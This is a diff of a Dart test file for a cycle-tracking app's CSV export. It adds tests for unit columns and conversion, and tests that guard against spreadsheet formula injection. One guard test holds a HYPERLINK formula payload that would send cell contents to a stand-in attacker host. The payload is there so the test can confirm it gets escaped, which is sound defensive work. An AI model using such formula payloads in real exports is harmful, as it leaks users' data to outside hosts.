@@ -6,6 +6,7 @@ import 'package:lunarlog/domain/export/csv_export.dart';
 import 'package:lunarlog/domain/models/day_entry.dart';
 import 'package:lunarlog/domain/models/flow_level.dart';
 import 'package:lunarlog/domain/models/local_date.dart';
+import 'package:lunarlog/domain/models/measurement_unit.dart';
 import 'package:lunarlog/domain/models/observation.dart';
 
 DayEntry _entry({
@@ -36,6 +37,7 @@ Observation _observation({
   required String category,
   String? code,
   double? valueNum,
+  String? unit,
   int? intensity,
   DateTime? deletedAt,
 }) =>
@@ -48,6 +50,7 @@ Observation _observation({
       category: category,
       code: code,
       valueNum: valueNum,
+      unit: unit,
       intensity: intensity,
       deletedAt: deletedAt,
       updatedAt: DateTime.utc(2026, 4, 1),
@@ -72,6 +75,56 @@ void main() {
     test('encloses in quotes when newline is present', () {
       expect(escapeCsvField('line 1\nline 2'), '"line 1\nline 2"');
       expect(escapeCsvField('line 1\r\nline 2'), '"line 1\r\nline 2"');
+    });
+  });
+
+  group('escapeCsvField: Issue #563 formula-injection guard', () {
+    void expectGuarded(String input) {
+      expect(escapeCsvField(input), "\"'$input\"", reason: input);
+    }
+
+    test('a field starting with = is prefixed with an apostrophe and '
+        'force-quoted', () => expectGuarded('=1+1'));
+
+    test('a field starting with + is prefixed with an apostrophe and '
+        'force-quoted', () => expectGuarded('+1+1'));
+
+    test('a field starting with - is prefixed with an apostrophe and '
+        'force-quoted', () => expectGuarded('-1+1'));
+
+    test('a field starting with @ is prefixed with an apostrophe and '
+        'force-quoted', () => expectGuarded('@SUM(A1:A9)'));
+
+    test('a field starting with a tab is prefixed with an apostrophe and '
+        'force-quoted', () => expectGuarded('\t=1+1'));
+
+    test('a field starting with a bare CR is prefixed with an apostrophe '
+        'and force-quoted', () => expectGuarded('\r=1+1'));
+
+    test('a field that also needs RFC 4180 quoting (embedded comma and '
+        'quotes) is still just single-apostrophe-prefixed and quoted once',
+        () {
+      const formula = '=HYPERLINK("https://evil.example/?x="&A1&B1,"Open")';
+      expect(
+        escapeCsvField(formula),
+        '"\'=HYPERLINK(""https://evil.example/?x=""&A1&B1,""Open"")"',
+      );
+    });
+
+    test('an ordinary field starting with a harmless character is '
+        'untouched (no leading apostrophe added when there is nothing to '
+        'guard against)', () {
+      expect(escapeCsvField('normal text'), 'normal text');
+      expect(escapeCsvField('2026-03-01'), '2026-03-01');
+    });
+
+    test('Issue #563: a value legitimately starting with "-" is still '
+        'guarded — a deliberate, documented trade-off, not an oversight. '
+        'It is safe for this exporter because none of its numeric columns '
+        'can legitimately be negative: bbt/weight are physical '
+        'measurements (always positive), and every other numeric column '
+        'is a non-negative count or an ISO date', () {
+      expectGuarded('-97.8');
     });
   });
 
@@ -178,7 +231,7 @@ void main() {
       final csv = buildDailyLogCsv(entries: const <DayEntry>[], observations: const <Observation>[]);
       expect(
         csv,
-        'date,flow,pms,tags,pain_intensity,spotting,notes,bbt,weight\r\n',
+        'date,flow,pms,tags,pain_intensity,spotting,notes,bbt,bbt_unit,weight,weight_unit\r\n',
       );
     });
 
@@ -202,11 +255,14 @@ void main() {
       final csv = buildDailyLogCsv(entries: entries, observations: obs);
       expect(
         csv,
-        'date,flow,pms,tags,pain_intensity,spotting,notes,bbt,weight\r\n',
+        'date,flow,pms,tags,pain_intensity,spotting,notes,bbt,bbt_unit,weight,weight_unit\r\n',
       );
     });
 
-    test('serializes complete daily log with tags, pain intensity, spotting, bbt, and weight', () {
+    test('serializes complete daily log with tags, pain intensity, spotting, '
+        'bbt, and weight — units normalized to the (default metric) display '
+        'preference and carried in their own columns (Issue #612, LLA-093)',
+        () {
       final entries = [
         _entry(
           id: 'e1',
@@ -236,13 +292,15 @@ void main() {
           id: 'o2',
           date: LocalDate(2026, 4, 1),
           category: 'bbt',
-          valueNum: 97.8,
+          valueNum: 36.5,
+          unit: 'celsius',
         ),
         _observation(
           id: 'o3',
           date: LocalDate(2026, 4, 1),
           category: 'weight',
-          valueNum: 135.5,
+          valueNum: 61.5,
+          unit: 'kg',
         ),
         // Observation without an entry on 2026-04-03:
         _observation(
@@ -255,13 +313,140 @@ void main() {
       final csv = buildDailyLogCsv(entries: entries, observations: obs);
       final lines = csv.split('\r\n');
 
-      expect(lines[0], 'date,flow,pms,tags,pain_intensity,spotting,notes,bbt,weight');
-      // 2026-04-01: heavy, pms=true, tags=cramps;fatigue, pelvic:4, spotting=false, notes quoted because of comma, bbt=97.8, weight=135.5
-      expect(lines[1], '2026-04-01,heavy,true,cramps;fatigue,pelvic:4,false,"Heavy flow today, took ibuprofen.",97.8,135.5');
+      expect(lines[0],
+          'date,flow,pms,tags,pain_intensity,spotting,notes,bbt,bbt_unit,weight,weight_unit');
+      // 2026-04-01: heavy, pms=true, tags=cramps;fatigue, pelvic:4, spotting=false, notes quoted because of comma, bbt=36.5 celsius (unchanged: already the default display unit), weight=61.5 kg
+      expect(lines[1],
+          '2026-04-01,heavy,true,cramps;fatigue,pelvic:4,false,"Heavy flow today, took ibuprofen.",36.5,celsius,61.5,kg');
       // 2026-04-02: spotting, pms=false, spotting=true, notes quoted because of newline
-      expect(lines[2], '2026-04-02,spotting,false,,,true,"Light spotting\nwith note",,');
+      expect(lines[2], '2026-04-02,spotting,false,,,true,"Light spotting\nwith note",,,,');
       // 2026-04-03: entry is null so flow is none, spotting is true from observation
-      expect(lines[3], '2026-04-03,none,false,,,true,,,');
+      expect(lines[3], '2026-04-03,none,false,,,true,,,,,');
+    });
+
+    group('unit normalization (Issue #612, LLA-093)', () {
+      test('a Fahrenheit bbt row normalizes to Celsius when the profile '
+          'displays Celsius (the default)', () {
+        final obs = [
+          _observation(
+            id: 'o1',
+            date: LocalDate(2026, 4, 1),
+            category: 'bbt',
+            valueNum: 98.6, // 37.0°C
+            unit: 'fahrenheit',
+          ),
+        ];
+        final csv = buildDailyLogCsv(entries: const [], observations: obs);
+        final lines = csv.split('\r\n');
+        final fields = lines[1].split(',');
+        // bbt, bbt_unit columns (indices 7, 8).
+        expect(double.parse(fields[7]), closeTo(37.0, 0.01));
+        expect(fields[8], 'celsius');
+      });
+
+      test('two rows logged in DIFFERENT units both normalize to the same '
+          'display unit — mixed-unit history no longer produces '
+          'indistinguishable numbers in the same column', () {
+        final obs = [
+          _observation(
+            id: 'o1',
+            date: LocalDate(2026, 4, 1),
+            category: 'bbt',
+            valueNum: 36.5,
+            unit: 'celsius',
+          ),
+          _observation(
+            id: 'o2',
+            date: LocalDate(2026, 4, 2),
+            category: 'bbt',
+            valueNum: 98.6, // also 36.5-ish °C once converted
+            unit: 'fahrenheit',
+          ),
+        ];
+        final csv = buildDailyLogCsv(
+          entries: const [],
+          observations: obs,
+          bbtUnit: BbtUnit.celsius,
+        );
+        final lines = csv.split('\r\n');
+        final day1Bbt = double.parse(lines[1].split(',')[7]);
+        final day2Bbt = double.parse(lines[2].split(',')[7]);
+        expect(day1Bbt, 36.5);
+        expect(day2Bbt, closeTo(37.0, 0.01));
+        expect(lines[1].split(',')[8], 'celsius');
+        expect(lines[2].split(',')[8], 'celsius');
+      });
+
+      test('a Fahrenheit-display profile normalizes a Celsius-logged bbt '
+          'row into Fahrenheit', () {
+        final obs = [
+          _observation(
+            id: 'o1',
+            date: LocalDate(2026, 4, 1),
+            category: 'bbt',
+            valueNum: 37.0,
+            unit: 'celsius',
+          ),
+        ];
+        final csv = buildDailyLogCsv(
+          entries: const [],
+          observations: obs,
+          bbtUnit: BbtUnit.fahrenheit,
+        );
+        final lines = csv.split('\r\n');
+        final fields = lines[1].split(',');
+        expect(double.parse(fields[7]), closeTo(98.6, 0.1));
+        expect(fields[8], 'fahrenheit');
+      });
+
+      test('a pound-logged weight row normalizes to kilograms when the '
+          'profile displays kilograms (the default)', () {
+        final obs = [
+          _observation(
+            id: 'o1',
+            date: LocalDate(2026, 4, 1),
+            category: 'weight',
+            valueNum: 135.5,
+            unit: 'lb',
+          ),
+        ];
+        final csv = buildDailyLogCsv(entries: const [], observations: obs);
+        final lines = csv.split('\r\n');
+        final fields = lines[1].split(',');
+        // weight, weight_unit columns (indices 9, 10).
+        expect(double.parse(fields[9]), closeTo(61.46, 0.01));
+        expect(fields[10], 'kg');
+      });
+
+      test('an unrecognised or missing unit is never silently coerced to '
+          'the display default: the raw value passes through unconverted, '
+          'and the unit column names the row\'s own raw unit (or stays '
+          'empty when null) rather than a guessed one', () {
+        final obs = [
+          _observation(
+            id: 'o1',
+            date: LocalDate(2026, 4, 1),
+            category: 'bbt',
+            valueNum: 97.8,
+            unit: null,
+          ),
+          _observation(
+            id: 'o2',
+            date: LocalDate(2026, 4, 2),
+            category: 'weight',
+            valueNum: 12.3,
+            unit: 'stone', // not one of the closed set
+          ),
+        ];
+        final csv = buildDailyLogCsv(entries: const [], observations: obs);
+        final lines = csv.split('\r\n');
+        final day1 = lines[1].split(',');
+        expect(day1[7], '97.8');
+        expect(day1[8], ''); // no raw unit to report
+        final day2 = lines[2].split(',');
+        expect(day2[9], '12.3');
+        expect(day2[10], 'stone'); // named, not fabricated as kg
+      });
     });
   });
 }
